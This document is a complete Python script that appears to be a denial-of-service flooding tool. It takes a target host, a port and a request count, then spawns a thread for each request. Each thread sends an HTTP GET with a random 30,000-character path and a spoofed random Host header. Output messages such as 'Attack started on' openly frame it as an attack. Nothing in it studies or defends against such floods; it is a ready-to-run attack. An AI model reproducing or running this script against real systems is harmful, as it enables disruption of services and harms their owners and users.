import random
import socket
import string
import sys
import threading
import time
from urllib.parse import urlparse

target = ""
port = 0
num_requests = 0

if len(sys.argv) == 4:
    target = sys.argv[1]
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR: Invalid number of arguments\nUsage: {sys.argv[0]} <Public_IP_or_URL> <Port> <Number_of_Attacks>")
    sys.exit(1)

# check if the target is an IP or a URL
try:
    target_ip = socket.gethostbyname(target)
except socket.gaierror:
    parsed_url = urlparse(target)
    target_ip = socket.gethostbyname(parsed_url.netloc)

# set number of threads
thread_num = 100
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1

    sys.stdout.write(f"\r[{time.ctime().split()[3]}] [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# set payload size
def generate_large_payload(size=30000):
    msg = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(size))
    return msg

def random_host():
    # generate a random alphanumeric host name of length 10
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))

def attack():
    print_status()
    url_path = generate_large_payload()

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((target_ip, port))

        custom_host_header = random_host() + ".com"
        http_request = (f"GET /{url_path} HTTP/1.1\nHost: {custom_host_header}\n\n").encode()
        dos.send(http_request)
    except socket.error as e:
        print(f"\nERROR: {str(e)}")
    finally:
        # close the socket to release the file descriptor (!!!)
        dos.close()

print(f"[#] Attack started on {target_ip} || Port: {str(port)} || # Requests: {str(num_requests)}")

# spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
